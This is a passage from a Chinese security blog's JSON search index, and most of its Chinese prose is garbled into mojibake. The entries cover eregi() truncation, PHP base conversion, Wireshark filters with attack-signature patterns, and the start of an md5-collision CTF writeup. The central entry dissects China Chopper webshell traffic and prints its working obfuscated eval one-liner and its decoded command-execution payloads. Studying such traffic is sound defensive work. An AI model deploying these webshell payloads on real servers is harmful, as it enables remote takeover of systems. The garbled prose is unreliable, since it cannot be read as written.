å®é™…å­—ç¬¦ä¸²é•¿åº¦ä¸º 8 å­—èŠ‚ï¼Œä½†åœ¨åå°è„šæœ¬è¯»å…¥æ•°æ®æ—¶ï¼Œä¼šå°† URL ç¼–ç  %00 è½¬æ¢æˆ 1 å­—èŠ‚ã€‚æ‰€ä»¥è¯´ï¼Œç©ºå­—ç¬¦åº”è¯¥åœ¨åå°è„šæœ¬çš„å˜é‡ä¸­å‡ºç°ï¼Œè€Œä¸æ˜¯åœ¨ URL æŸ¥è¯¢å­—ç¬¦ä¸²å˜é‡ä¸­å‡ºç° æ€»ç»“eregi() æˆªæ–­æ¼æ´/ å­¦åˆ°äº†å­¦åˆ°äº†!","categories":[{"name":"ç½‘ç»œå®‰å…¨","slug":"ç½‘ç»œå®‰å…¨","permalink":"https://bobtaoy.github.io/categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/"}],"tags":[{"name":"CTF","slug":"CTF","permalink":"https://bobtaoy.github.io/tags/CTF/"}]},{"title":"PHPè¿›åˆ¶ç›¸äº’è½¬æ¢å­¦ä¹ ","slug":"PHPè¿›åˆ¶ç›¸äº’è½¬æ¢å­¦ä¹ ","date":"2020-10-03T07:11:26.000Z","updated":"2020-10-03T08:18:40.340Z","comments":true,"path":"2020/10/03/PHPè¿›åˆ¶ç›¸äº’è½¬æ¢å­¦ä¹ /","link":"","permalink":"https://bobtaoy.github.io/2020/10/03/PHP%E8%BF%9B%E5%88%B6%E7%9B%B8%E4%BA%92%E8%BD%AC%E6%8D%A2%E5%AD%A6%E4%B9%A0/","excerpt":"","text":"å‰è¨€ ä¸ç®¡æ˜¯SQLæ³¨å…¥ï¼Œè¿˜æ˜¯CTFçš„webé¢˜ï¼Œéƒ½æœ‰æ¶‰åŠ16è¿›åˆ¶è½¬æ¢ï¼Œæ‰€ä»¥ç‰¹æ­¤å­¦ä¹ ä»¥ä¸‹ 123456789101112131415161718192021222324252627282930313233343536373839&lt;?php// 1. åè¿›åˆ¶è½¬äºŒè¿›åˆ¶ decbin()å‡½æ•°echo &quot;12-&gt;åè¿›åˆ¶è½¬äºŒè¿›åˆ¶ä¸º: &quot;.decbin(12); //è¾“å‡ºï¼š1100echo &#x27;&lt;hr&gt;&#x27;;// string decbin(int number)è¿”å›ä¸€å­—ç¬¦ä¸²ï¼ŒåŒ…å«æœ‰ç»™å®š number å‚æ•°çš„äºŒè¿›åˆ¶è¡¨ç¤ºã€‚æ‰€èƒ½è½¬æ¢çš„æœ€å¤§æ•°å€¼ä¸ºåè¿›åˆ¶çš„ // 2. åè¿›åˆ¶è½¬å…«è¿›åˆ¶decoct()å‡½æ•°echo &quot;15-&gt;åè¿›åˆ¶è½¬å…«è¿›åˆ¶: &quot;.decoct(15); // è¾“å‡º: 17echo &#x27;&lt;hr&gt;&#x27;;//string decoct ( int number ) è¿”å›ä¸€å­—ç¬¦ä¸²ï¼ŒåŒ…å«æœ‰ç»™å®š number å‚æ•°çš„å…«è¿›åˆ¶è¡¨ç¤º// 3. åè¿›åˆ¶è½¬åå…­è¿›åˆ¶ dechex() å‡½æ•°echo &quot;10-&gt;åè¿›åˆ¶è½¬16è¿›åˆ¶: &quot;.dechex(10);echo &#x27;&lt;hr&gt;&#x27;;// string dechex ( int number ) è¿”å›ä¸€å­—ç¬¦ä¸²ï¼ŒåŒ…å«æœ‰ç»™å®š number å‚æ•°çš„åå…­è¿›åˆ¶è¡¨ç¤º// 1. äºŒè¿›åˆ¶è½¬åå…­è¿›åˆ¶ bin2hex() å‡½æ•°echo &quot;1100-&gt;äºŒè¿›åˆ¶è½¬åå…­è¿›åˆ¶ä¸º: &quot;.bin2hex(&#x27;1100&#x27;);echo &#x27;&lt;hr&gt;&#x27;;// 2. äºŒè¿›åˆ¶è½¬åè¿›åˆ¶ bindec()å‡½æ•°echo &quot;1100-&gt;äºŒè¿›åˆ¶è½¬åå…­è¿›åˆ¶ä¸º: &quot;.bindec(&#x27;1100&#x27;);echo &#x27;&lt;hr&gt;&#x27;;// 3. å…«è¿›åˆ¶è½¬åè¿›åˆ¶ octdec()å‡½æ•°echo &quot;17-&gt;å…«è¿›åˆ¶è½¬åè¿›åˆ¶: &quot;.octdec(&#x27;17&#x27;);echo &#x27;&lt;hr&gt;&#x27;;// 4. åå…­è¿›åˆ¶è½¬åè¿›åˆ¶ hexdec()echo &quot;aaa-&gt;åå…­è¿›åˆ¶è½¬åè¿›åˆ¶: &quot;.hexdec(&#x27;aaa&#x27;);echo &quot;&lt;hr&gt;&quot;;// ç»ˆææ­¦å™¨.ä»»æ„è¿›åˆ¶è½¬æ¢ base_convert(),åœ¨æ­¤ä¸¾ä¸¤ä¸ªä¾‹å­echo &quot;520-&gt;åè¿›åˆ¶è½¬åå…­è¿›åˆ¶: &quot;.base_convert(&#x27;520&#x27;, 10, 16); // åè¿›åˆ¶è½¬16è¿›åˆ¶echo &quot;&lt;hr&gt;&quot;;echo &quot;aaa-&gt;åå…­è¿›åˆ¶è½¬åè¿›åˆ¶: &quot;.base_convert(&#x27;aaa&#x27;, 16, 10);?&gt; 12345678910è¾“å‡ºï¼š12-&gt;åè¿›åˆ¶è½¬äºŒè¿›åˆ¶ä¸º: 110015-&gt;åè¿›åˆ¶è½¬å…«è¿›åˆ¶: 1710-&gt;åè¿›åˆ¶è½¬16è¿›åˆ¶: a1100-&gt;äºŒè¿›åˆ¶è½¬åå…­è¿›åˆ¶ä¸º: 313130301100-&gt;äºŒè¿›åˆ¶è½¬åå…­è¿›åˆ¶ä¸º: 1217-&gt;å…«è¿›åˆ¶è½¬åè¿›åˆ¶: 15aaa-&gt;åå…­è¿›åˆ¶è½¬åè¿›åˆ¶: 2730520-&gt;åè¿›åˆ¶è½¬åå…­è¿›åˆ¶: 208aaa-&gt;åå…­è¿›åˆ¶è½¬åè¿›åˆ¶: 2730 æ€»ç»“base_convert() ä¼šç”¨å®ƒå°±å®Œäº‹äº†","categories":[{"name":"PHP","slug":"PHP","permalink":"https://bobtaoy.github.io/categories/PHP/"}],"tags":[]},{"title":"ä¸­å›½èœåˆ€åŸç†åˆ†æ","slug":"ä¸­å›½èœåˆ€åŸç†åˆ†æ","date":"2020-10-03T07:07:09.000Z","updated":"2020-10-03T08:19:35.464Z","comments":true,"path":"2020/10/03/ä¸­å›½èœåˆ€åŸç†åˆ†æ/","link":"","permalink":"https://bobtaoy.github.io/2020/10/03/%E4%B8%AD%E5%9B%BD%E8%8F%9C%E5%88%80%E5%8E%9F%E7%90%86%E5%88%86%E6%9E%90/","excerpt":"","text":"ä¸­å›½èœåˆ€-åˆ†æä»¥ä¸‹æ˜¯åˆšè¿æ¥æ—¶ï¼Œå‘é€çš„POSTè¯·æ±‚ é¦–å…ˆè¿›è¡Œä¸‰æ¬¡æ¡æ‰‹ï¼Œç„¶åPOSTè¯·æ±‚äº†tao.phpè¿™ä¸ªæœ¨é©¬æ–‡ä»¶ï¼Œæˆ‘è¿™é‡Œå¯†ç æ˜¯aï¼Œç„¶åæˆ‘æŸ¥çœ‹è®¿é—®tao.phpçš„POSTè¯·æ±‚æ•°æ®ï¼Œåœ¨æ•°æ®ä¸­å‘ç°å¦‚ä¸‹ä»£ç  12a=$xx=chr(98).chr(97).chr(115).chr(101).chr(54).chr(52).chr(95).chr(100).chr(101).chr(99).chr(111).chr(100).chr(101);$yy=$_POST;@eval/**/.($xx/**/.($yy[z0]));&amp;z0=QGluaV9zZXQoImRpc3BsYXlfZXJyb3JzIiwiMCIpO0BzZXRfdGltZV9saW1pdCgwKTtAc2V0X21hZ2ljX3F1b3Rlc19ydW50aW1lKDApO2VjaG8oIi0+fCIpOzskRD1kaXJuYW1lKF9fRklMRV9fKTskUj0ieyREfVx0IjtpZihzdWJzdHIoJEQsMCwxKSE9Ii8iKXtmb3JlYWNoKHJhbmdlKCJBIiwiWiIpIGFzICRMKWlmKGlzX2RpcigieyRMfToiKSkkUi49InskTH06Ijt9JFIuPSJcdCI7JHU9KGZ1bmN0aW9uX2V4aXN0cygncG9zaXhfZ2V0ZWdpZCcpKT9AcG9zaXhfZ2V0cHd1aWQoQHBvc2l4X2dldGV1aWQoKSk6Jyc7JHVzcj0oJHUpPyR1WyduYW1lJ106QGdldF9jdXJyZW50X3VzZXIoKTskUi49cGhwX3VuYW1lKCk7JFIuPSIoeyR1c3J9KSI7cHJpbnQgJFI7O2VjaG8oInw8LSIpO2RpZSgpOw==# æ³¨ï¼š %3D-&gt;urlè§£å¯†-&gt;= å…¶ä¸­a=$xx=chr(98).chr(97).chr(115).chr(101).chr(54).chr(52).chr(95).chr(100).chr(101).chr(99).chr(111).chr(100).chr(101);è¿™ä¸€ä¸²ï¼Œè½¬ç ä¸ºbase64_decode 1QGluaV9zZXQoImRpc3BsYXlfZXJyb3JzIiwiMCIpO0BzZXRfdGltZV9saW1pdCgwKTtAc2V0X21hZ2ljX3F1b3Rlc19ydW50aW1lKDApO2VjaG8oIi0+fCIpOzskRD1kaXJuYW1lKF9fRklMRV9fKTskUj0ieyREfVx0IjtpZihzdWJzdHIoJEQsMCwxKSE9Ii8iKXtmb3JlYWNoKHJhbmdlKCJBIiwiWiIpIGFzICRMKWlmKGlzX2RpcigieyRMfToiKSkkUi49InskTH06Ijt9JFIuPSJcdCI7JHU9KGZ1bmN0aW9uX2V4aXN0cygncG9zaXhfZ2V0ZWdpZCcpKT9AcG9zaXhfZ2V0cHd1aWQoQHBvc2l4X2dldGV1aWQoKSk6Jyc7JHVzcj0oJHUpPyR1WyduYW1lJ106QGdldF9jdXJyZW50X3VzZXIoKTskUi49cGhwX3VuYW1lKCk7JFIuPSIoeyR1c3J9KSI7cHJpbnQgJFI7O2VjaG8oInw8LSIpO2RpZSgpOw== ä¸Šé¢è¿™æ®µbase64åŠ å¯†çš„è§£ç ä¸º 1@ini_set(&quot;display_errors&quot;,&quot;0&quot;);@set_time_limit(0);@set_magic_quotes_runtime(0);echo(&quot;-&gt;|&quot;);;$D=dirname(__FILE__);$R=&quot;&#123;$D&#125;\\t&quot;;if(substr($D,0,1)!=&quot;/&quot;)&#123;foreach(range(&quot;A&quot;,&quot;Z&quot;) as $L)if(is_dir(&quot;&#123;$L&#125;:&quot;))$R.=&quot;&#123;$L&#125;:&quot;;&#125;$R.=&quot;\\t&quot;;$u=(function_exists(&#x27;posix_getegid&#x27;))?@posix_getpwuid(@posix_geteuid()):&#x27;&#x27;;$usr=($u)?$u[&#x27;name&#x27;]:@get_current_user();$R.=php_uname();$R.=&quot;(&#123;$usr&#125;)&quot;;print $R;;echo(&quot;|&lt;-&quot;);die(); æˆ‘ä»¬å°†æ•´ä¸ªä»£ç è¿›è¡Œæ•´ç† 1234567891011121314151617181920212223242526&lt;?php$xx = base64_decode;$yy = $_POST;z0 = @ini_set(&quot;display_errors&quot;,&quot;0&quot;); # ä¸´æ—¶å…³é—­PHPçš„é”™è¯¯æ˜¾ç¤ºåŠŸèƒ½@set_time_limit(0); # é˜²æ­¢åƒdirã€ä¸Šä¼ æ–‡ä»¶å¤§é©¬æ—¶è¶…æ—¶@set_magic_quotes_runtime(0); # å…³é—­é­”æœ¯å¼•å· è¿™ä¸œè¥¿åœ¨4.0ä»¥åå°±ä¸æ€ä¹ˆç”¨äº†echo(&quot;-&gt;|&quot;);;$D=dirname(__FILE__);$R=&quot;&#123;$D&#125;\\t&quot;;if(substr($D,0,1)!=&quot;/&quot;)&#123; foreach(range(&quot;A&quot;,&quot;Z&quot;) as $L) if(is_dir(&quot;&#123;$L&#125;:&quot;)) $R.=&quot;&#123;$L&#125;:&quot;;&#125;$R.=&quot;\\t&quot;;$u=(function_exists(&#x27;posix_getegid&#x27;))?@posix_getpwuid(@posix_geteuid()):&#x27;&#x27;;$usr=($u)?$u[&#x27;name&#x27;]:@get_current_user();$R.=php_uname();$R.=&quot;(&#123;$usr&#125;)&quot;;print $R;echo(&quot;|&lt;-&quot;);die();@eval(base64_decode($_POST[z0]))# ä»¥ä¸‹æ˜¯ä¼šæ˜¾ä¿¡æ¯ z1 = C:\\\\phpStudy\\\\PHPTutorial\\\\WWW\\\\ # è§£ç åçš„?&gt;# ä¸Šè¿°ä»£ç  å¾…ç ”ç©¶ æ³¨: æˆ‘é‡æ–°è¿æ¥ï¼Œé‡æ–°æŠ“åŒ…çš„æ—¶å€™ï¼Œå‘ç°z1ä¸æ˜¯å›æ˜¾äº†ï¼Œè€Œæ˜¯ä¹‹å‰è¯·æ±‚ ä»¥ä¸‹æˆ‘å‘ç°ï¼Œæ–‡ä»¶ç®¡ç†ä¸­,åˆ†ä¸ºä¸¤ä¸ªå‚æ•°z0,z1 æˆ‘åœ¨å…¶ä¸­è¿˜åˆ é™¤äº†å‡ ä¸ªæ–‡ä»¶ï¼ŒQzpcXHBocFN0dWR5XFxQSFBUdXRvcmlhbFxcV1dXXFxpbmRleC5waHA= ä»¥ä¸Šéƒ½æ˜¯ä½¿ç”¨æ–‡ä»¶ç®¡ç†åŠŸèƒ½ è€Œæˆ‘çš„ä¸‹ä¸€æ­¥æ“ä½œå°±æ˜¯ï¼Œä½¿ç”¨èœåˆ€è¿æ¥äº†è™šæ‹Ÿç»ˆç«¯ï¼Œå‘ç°äº†ä¸€ä¸ªæ–°å‚æ•°z2,ä½†æ˜¯å…¶ä¸­z1æ˜¯æ›´ä¸ºæ˜æ˜¾çš„è±¡å¾ï¼Œå…¶ä¸­z0çš„å€¼ä¹Ÿå‘ç”Ÿäº†æ”¹å˜ 12345678910111213141516171819202122232425&lt;?phpz0 = @ini_set(&quot;display_errors&quot;,&quot;0&quot;);@set_time_limit(0);@set_magic_quotes_runtime(0);echo(&quot;-&gt;|&quot;);;$m=get_magic_quotes_gpc();$p=base64_decode($m?stripslashes($_POST[&quot;z1&quot;]):$_POST[&quot;z1&quot;]);$s=base64_decode($m?stripslashes($_POST[&quot;z2&quot;]):$_POST[&quot;z2&quot;]);$d=dirname($_SERVER[&quot;SCRIPT_FILENAME&quot;]); # dirname() å‡½æ•°è¿”å›è·¯å¾„ä¸­çš„ç›®å½•éƒ¨åˆ† # $_SERVER[&quot;SCRIPT_FILENAME&quot;] å½“å‰æ‰§è¡Œè„šæœ¬çš„ç»å¯¹è·¯å¾„/*å¦‚æœåœ¨å‘½ä»¤è¡Œç•Œé¢ï¼ˆCommand Line Interface, CLIï¼‰ä½¿ç”¨ç›¸å¯¹è·¯å¾„æ‰§è¡Œè„šæœ¬ï¼Œä¾‹å¦‚ file.php æˆ– ../file.phpï¼Œé‚£ä¹ˆ $_SERVER[&#x27;SCRIPT_FILENAME&#x27;] å°†åŒ…å«ç”¨æˆ·æŒ‡å®šçš„ç›¸å¯¹è·¯å¾„ã€‚*/$c=substr($d,0,1)==&quot;/&quot;?&quot;-c \\&quot;&#123;$s&#125;\\&quot;&quot;:&quot;/c \\&quot;&#123;$s&#125;\\&quot;&quot;;$r=&quot;&#123;$p&#125; &#123;$c&#125;&quot;;# substr() å‡½æ•°è¿”å›å­—ç¬¦ä¸²çš„ä¸€éƒ¨åˆ†$array=array(array(&quot;pipe&quot;,&quot;r&quot;),array(&quot;pipe&quot;,&quot;w&quot;),array(&quot;pipe&quot;,&quot;w&quot;));$fp=proc_open($r.&quot; 2&gt;&amp;1&quot;,$array,$pipes);$ret=stream_get_contents($pipes[1]);proc_close($fp);print $ret;;echo(&quot;|&lt;-&quot;);die();?&gt; 12Y21k -&gt; cmdY2QgL2QgQzpccGhwU3R1ZHlcUEhQVHV0b3JpYWxcV1dXXCZuZXRzdGF0IC1hbiB8IGZpbmQgIkVTVEFCTElTSEVEIiZlY2hvIFtTXSZjZCZlY2hvIFtFXQ== -&gt; cd /d C:\\phpStudy\\PHPTutorial\\WWW\\&amp;netstat -an | find &quot;ESTABLISHED&quot;&amp;echo [S]&amp;cd&amp;echo [E] æ²¡é”™ï¼Œæˆ‘ç¬¬ä¸€æ¡æ‰§è¡Œçš„å‘½ä»¤å°±æ˜¯ä»–è¿æ¥é»˜è®¤çš„ç¬¬ä¸€æ¡å‘½ä»¤ å†å¾€ä¸‹çœ‹ï¼Œæˆ‘å‘ç°ï¼Œè™šæ‹Ÿç»ˆç«¯æ‰§è¡Œçš„æ¯ä¸€æ¡å‘½ä»¤ï¼Œz1=cmd æ€»ç»“ æ–‡ä»¶ç®¡ç† key : è¿æ¥ä¸€å¥è¯æœ¨é©¬ value: è§£ç ä¸ºbase64_decode z0 -&gt; æœ¨é©¬æ ¸å¿ƒä»£ç  z1 -&gt; ç›®å½•ä¿¡æ¯ è™šæ‹Ÿç»ˆç«¯ key : è¿æ¥ä¸€å¥è¯æœ¨é©¬ value: è§£ç ä¸ºbase64_decode z0 -&gt; æœ¨é©¬æ ¸å¿ƒä»£ç  z1 -&gt; cmd (windows) æˆ–è€… /bin/sh (Linux) z2 -&gt; æ‰§è¡Œçš„å‘½ä»¤ æœ‰äº›å‡½æ•°æ²¡è§è¿‡ï¼Œæœ‰æ—¶é—´å†æ›´æ–°â€¦ å‚è€ƒé“¾æ¥ http://blog.ernket.top/2019/10/02/zhong-guo-cai-dao-fen-xi/ https://www.cnblogs.com/milantgh/p/4285735.html","categories":[{"name":"webå®‰å…¨","slug":"webå®‰å…¨","permalink":"https://bobtaoy.github.io/categories/web%E5%AE%89%E5%85%A8/"}],"tags":[{"name":"å¸¸ç”¨å·¥å…·","slug":"å¸¸ç”¨å·¥å…·","permalink":"https://bobtaoy.github.io/tags/%E5%B8%B8%E7%94%A8%E5%B7%A5%E5%85%B7/"}]},{"title":"Wireshark å®ç”¨å°æŠ€å·§","slug":"Wireshark å®ç”¨å°æŠ€å·§","date":"2020-10-03T06:58:39.000Z","updated":"2020-10-03T08:19:11.841Z","comments":true,"path":"2020/10/03/Wireshark å®ç”¨å°æŠ€å·§/","link":"","permalink":"https://bobtaoy.github.io/2020/10/03/Wireshark%20%E5%AE%9E%E7%94%A8%E5%B0%8F%E6%8A%80%E5%B7%A7/","excerpt":"","text":"Wiresharkå®ç”¨å°æŠ€å·§ç”±äºæ¯”èµ›æ•°æ®åŒ…ä¸€èˆ¬éƒ½æ¯”è¾ƒå¤§ï¼Œå…ˆé€šè¿‡è„šæœ¬è¿›è¡Œä¸‹æµé‡æ¸…æ´—ä¼šæœ‰äº‹åŠåŠŸå€çš„æ•ˆæœï¼ˆæ„Ÿè§‰ä¸Škaliä¸‹wiresharkå‘½ä»¤è¡Œå·¥å…·tsharkä»¥åŠTCPdumpæ•ˆç‡æ›´é«˜ï¼Œå› ä¸ºæ˜¯å‘½ä»¤è¡Œçš„åŸå› ï¼Œåè€Œæ›´æœ‰åˆ©äºå‡å°‘å¹²æ‰°ï¼Œä¿æŒä¸“æ³¨)ã€‚ ä»¥ä¸‹ä¸ºå‡ ç‚¹æ³¨æ„äº‹é¡¹ï¼š 1ã€wiresharkè¿‡æ»¤DHCPæ—¶ç›´æ¥è¾“å…¥dhcpä¼šæŠ¥é”™ï¼Œåº”è¾“å…¥bootp 2ã€åˆ©ç”¨è¿‡æ»¤httpï¼Œå¯¼å‡ºhttpï¼Œä¿å­˜æˆç›¸åº”æ–‡ä»¶ã€‚ â€‹ 3ã€urldecodeè§£ç ï¼Œè§£ç åz0éƒ¨åˆ†base64è§£ç ï¼ŒPHPä»£ç åœ¨çº¿æ ¼å¼åŒ–ï¼ˆè¾“å…¥å¤´&lt;?php ç‚¹å‡»æ ¼å¼åŒ–å³å¯ï¼‰â€‹ 4ã€ä¸€èˆ¬å…ˆurlè§£ç ï¼Œå†è½½base64è§£ç â€‹ 5ã€æ”»å‡»è¡Œä¸ºç‰¹å¾ å¤§é‡404 ç›®å½•æ‰«æ select â€¦ from ç­‰å…³é”®è¯ sqlæ³¨å…¥ POSTè¯·æ±‚ ç”¨æˆ·åå’Œå¯†ç â€”â€”çˆ†ç ´ /../../.. æµ‹è¯•æ–‡ä»¶åŒ…å« echoç­‰ å‘½ä»¤æ‰§è¡Œ httpã€POSTã€â€@evalâ€œ ä¸€å¥è¯æœ¨é©¬ç‰¹å¾ å†…ç½‘ç¯å¢ƒï¼Œå› æ­¤æ”»å‡»è€…ä¸€èˆ¬ä¸ºå¤–ç½‘ipï¼Œè¢«æ”»å‡»è€…ä¸ºå†…ç½‘ æœ€åä¸€æ¡loginä¿¡æ¯ï¼Œä¸­æäº¤çš„ç”¨æˆ·åå¯†ç ï¼Œä¸”ä¸‹ä¸€æ¬¡è®¿é—®æ¢äº†ç›®å½•ï¼Œä¸€èˆ¬ä¸ºæ”»å‡»è€…æˆåŠŸç ´è§£å¹¶ç™»å½• å…³é”®å­— è¿‡æ»¤å¤šä¸ªå…³é”®å­—ï¼šip.addr == æ”»å‡»è€…IP and http.request.uri matches â€œedit|upload|login| modify â€œ æ–‡ä»¶ä¿®æ”¹å…³é”®å­—ï¼šedit/upload/modify ç™»å½•å…³é”®å­—: admin/login/manage èœåˆ€ æŸ¥çœ‹èœåˆ€è¿æ¥åœ°å€åœ¨ä¸Šä¸€å±‚ä¼ è¾“å±‚ ctrl+shift+nè¿½è¸ªåˆ°ä¸‹ä¸€æ¡ æ³¨ï¼šå¦‚æœæ˜¯æ˜æ–‡è¯´æ˜æ˜¯ä¸‹è½½æ–‡ä»¶ï¼›base64ç¼–ç åˆ™æ˜¯è¯»å–æ–‡ä»¶å†…å®¹ ftpè¿‡æ»¤è¯­å¥ï¼šftp-data or ftp è¿½è¸ªæµæ˜¾ç¤º æ„ä¹‰ STOR ä¸Šä¼ å‘½ä»¤ DELE åˆ é™¤ CWD è¯·æ±‚ç›®å½• LIST åˆ—å‡ºç›®å½•å†…å®¹ åº”æ€¥å“åº”æµ…æwindows åç§° æè¿° å·¥å…·æ¥æº cmd å‘½ä»¤æ¨¡å¼ winè‡ªå¸¦ net ç½‘ç»œç®¡ç†å‘½ä»¤ winè‡ªå¸¦ netstat ç½‘ç»œè¿æ¥çŠ¶æ€å‘½ä»¤ winè‡ªå¸¦ ipconfig ipçŠ¶æ€å‚æ•° winè‡ªå¸¦ regedit æ³¨å†Œè¡¨ç¼–è¾‘å™¨ winè‡ªå¸¦ secpol.msc æœ¬åœ°å®‰å…¨ç­–ç•¥ winè‡ªå¸¦ gpedit.msc æœ¬åœ°å®‰å…¨ç»„ç­–ç•¥ winè‡ªå¸¦ lusrmgr.msc ç”¨æˆ·ç®¡ç†å™¨ winè‡ªå¸¦ eventvwr.msc äº‹ä»¶æŸ¥çœ‹å™¨ winè‡ªå¸¦ msinfo32 ç³»ç»Ÿä¿¡æ¯ winè‡ªå¸¦ services.msc æœåŠ¡åˆ—è¡¨ winè‡ªå¸¦ at è®¡åˆ’ä»»åŠ¡ winè‡ªå¸¦ systeminfo ç³»ç»Ÿä¿¡æ¯ winè‡ªå¸¦ md5sum md5æ ¡éªŒå’Œæ£€æµ‹ GNU Windows tool fport è¿›ç¨‹å¯¹åº”ç«¯å£æ˜¾ç¤º Foundstone, inc Psfile åˆ—ä¸¾æ‰“å¼€æ–‡ä»¶ç³»ç»Ÿ Sysintemals Pskill æ€è¿›ç¨‹å‘½ä»¤ Sysintemals sc æœåŠ¡åˆ—ä¸¾å·¥å…· èµ„æºå·¥å…·ç®± Linux åç§° æè¿° æ¥æº ps æŸ¥çœ‹ç³»ç»Ÿè¿›ç¨‹ /usr/bin/ps ls æŸ¥çœ‹ç›®å½•ï¼Œæ–‡ä»¶åˆ—è¡¨ /usr/bin/ls df æŸ¥çœ‹ç£ç›˜ç©ºé—´ä½¿ç”¨æƒ…å†µ /usr/bin/df netstat æŸ¥çœ‹ç½‘ç»œè¿æ¥/ç«¯å£çŠ¶æ€ /usr/bin/netstat find æŸ¥æ‰¾æ–‡ä»¶ /usr/bin/find more åˆ†é¡µæ˜¾ç¤ºè¾“å‡ºä¿¡æ¯ /usr/bin/more chkrootkit æ£€æµ‹å¸¸è§çš„rootkit sunfreeware lsof æ£€æµ‹æ–‡ä»¶å’Œè¿›ç¨‹/ç«¯å£å…³è” sunfreeware md5 æ–‡ä»¶æ ¡éªŒå’Œ sunfreeware nc ç½‘ç»œå·¥å…· sunfreeware tcpdump sniffer è‡ªè¡Œä¸‹è½½ nmap ç«¯å£æ‰«æ è‡ªè¡Œä¸‹è½½ john æ£€æµ‹å£ä»¤å¼ºåº¦ è‡ªè¡Œä¸‹è½½ wireshark è¿‡æ»¤è§„åˆ™è¿‡æ»¤MACåœ°å€ è¿‡æ»¤è¯­å¥ è§£é‡Š eth.addr == 00:00:00:00:00:00 è¿‡æ»¤ç›®æ ‡æˆ–æºåœ°å€æ˜¯00:00:00:00:00:00 eth.src == 00:00:00:00:00:00 è¿‡æ»¤æºMACåœ°å€æ˜¯00:00:00:00:00:00 eth.dst == 00:00:00:00:00:00 è¿‡æ»¤ç›®æ ‡MACåœ°å€æ˜¯00:00:00:00:00:00 è¿‡æ»¤IP è¿‡æ»¤è¯­å¥ è§£é‡Š ip.src == 192.168.1.1 æºåœ°å€ä¸º192.168.1.1 ip.src eq 192.168.1.1 æºåœ°å€ä¸º192.168.1.1 ip.dst == 192.168.1.1 ç›®æ ‡åœ°å€ä¸º192.168.1.1 ip.dst eq 192.168.1.1 ç›®æ ‡åœ°å€ä¸º192.168.1.1 ip.addr == 192.168.1.1 ipåœ°å€è¿‡æ»¤ï¼Œä¸è®ºæºè¿˜æ˜¯ç›®æ ‡ ip.addr eq 192.168.1.1 ipåœ°å€è¿‡æ»¤ï¼Œä¸è®ºæºè¿˜æ˜¯ç›®æ ‡ ç«¯å£è¿‡æ»¤ è¿‡æ»¤è¯­å¥ è§£é‡Š tcp.port == 80 è¿‡æ»¤tcpç«¯å£80 udp.port eq 80 è¿‡æ»¤udpç«¯å£80 tcp.srcport == 80 tcpåè®®çš„æ¥æºç«¯å£æ˜¯80 tcp.dstport == 80 tcpåè®®çš„ç›®æ ‡ç«¯å£æ˜¯80 tcp.port &gt;=1 and tcp.port &lt;= 80 ç«¯å£èŒƒå›´è¿‡æ»¤: 1&lt;= tcpåè®®ç«¯å£ &lt;=80 å¸¸è§åè®®è¿‡æ»¤ è¿‡æ»¤åè®® tcp udp arp icmp http smtp ftp dns msnms ip ssl telnet oicq bootp â€¦ æ’é™¤åè®®åŒ…: !arp æˆ–è€… not arp httpæ¨¡å¼è¿‡æ»¤ è¿‡æ»¤è¯­å¥ è§£é‡Š http.request.method == â€œGETâ€ åªæ˜¾ç¤ºGETè¯·æ±‚ http.request.method == â€œPOSTâ€ åªæ˜¾ç¤ºPOSTè¯·æ±‚ http.request.uri == â€œ/login.phpâ€ æ˜¾ç¤ºè¯·æ±‚URLä¸­æœ‰login.php http contains â€œGETâ€ http contains â€œHTTP/1.1â€ è¯·æ±‚å¤´ è¿‡æ»¤è¯­å¥ è¯·æ±‚å¤´ï¼ˆGETï¼‰ http.request.method == â€œGETâ€ &amp;&amp; http contains â€œHost:â€ http.request.method == â€œGETâ€ &amp;&amp; http contains â€œUser-Agent:â€ è¯·æ±‚å¤´ï¼ˆPOSTï¼‰ http.request.method == â€œPOSTâ€ &amp;&amp; http contains â€œHost:â€ http.request.method == â€œPOSTâ€ &amp;&amp; http contains â€œUser-Agent:â€ å“åº”åŒ… http contains â€œHTTP/1.1 200 OKâ€ &amp;&amp; http contains â€œContent-Type:â€ http contains â€œHTTP/1.0 200 OKâ€ &amp;&amp; http contains â€œContent-Type:â€ è¿ç®—ç¬¦ åŸæ„ ç®€å†™ è§£é‡Š less than lt å°äº less and qeual le å°äºç­‰äº equal eq ç­‰äº great then gt å¤§äº great and equal ge å¤§äºç­‰äº not equal ne ä¸ç­‰äº TCPè¿‡æ»¤ è¿‡æ»¤è¯­å¥ è§£é‡Š tcp.flags æ˜¾ç¤ºåŒ…å«TCPæ ‡å¿—çš„å°åŒ… tcp.flags.syn == 0x02 æ˜¾ç¤ºåŒ…å«TCP SYNæ ‡å¿—çš„å°åŒ… tcp.window_size == 0 &amp;&amp; tcp.flags.reset != 1 tcp.flags.reset == 1 RST/ACK æ•°æ®åŒ… æ³¨: ä»¥ä¸Šä¸º æ˜¾ç¤ºè¿‡æ»¤å™¨ æœ€åï¼Œé™„ä¸Šä¸€å¼ wiresharkæ€ç»´å¯¼å›¾ å‚è€ƒé“¾æ¥ https://blog.csdn.net/y7u8t6/article/details/86511338 https://www.jianshu.com/p/63f6f7d5deed https://www.jianshu.com/p/bbd2ffe57aeb","categories":[{"name":"ç½‘ç»œå®‰å…¨","slug":"ç½‘ç»œå®‰å…¨","permalink":"https://bobtaoy.github.io/categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/"}],"tags":[{"name":"Wireshark","slug":"Wireshark","permalink":"https://bobtaoy.github.io/tags/Wireshark/"},{"name":"å¸¸ç”¨å·¥å…·","slug":"å¸¸ç”¨å·¥å…·","permalink":"https://bobtaoy.github.io/tags/%E5%B8%B8%E7%94%A8%E5%B7%A5%E5%85%B7/"}]},{"title":"å—é‚®CTF-CG Webé¢˜writeupè¯¦è§£","slug":"å—é‚®CTF-CG Webé¢˜writeupè¯¦è§£","date":"2020-09-26T07:02:59.000Z","updated":"2020-10-03T08:13:32.786Z","comments":true,"path":"2020/09/26/å—é‚®CTF-CG Webé¢˜writeupè¯¦è§£/","link":"","permalink":"https://bobtaoy.github.io/2020/09/26/%E5%8D%97%E9%82%AECTF-CG%20Web%E9%A2%98writeup%E8%AF%A6%E8%A7%A3/","excerpt":"","text":"ç­¾åˆ°é¢˜é¢˜ç›®é“¾æ¥ 1F12 # æŸ¥çœ‹æºä»£ç  md5 collisioné¢˜ç›®é“¾æ¥ æºä»£ç ï¼š 12345678910$md51 = md5(&#x27;QNKCDZO&#x27;);$a = @$_GET[&#x27;a&#x27;];$md52 = @md5($a);if(isset($a))&#123;if ($a != &#x27;QNKCDZO&#x27; &amp;&amp; 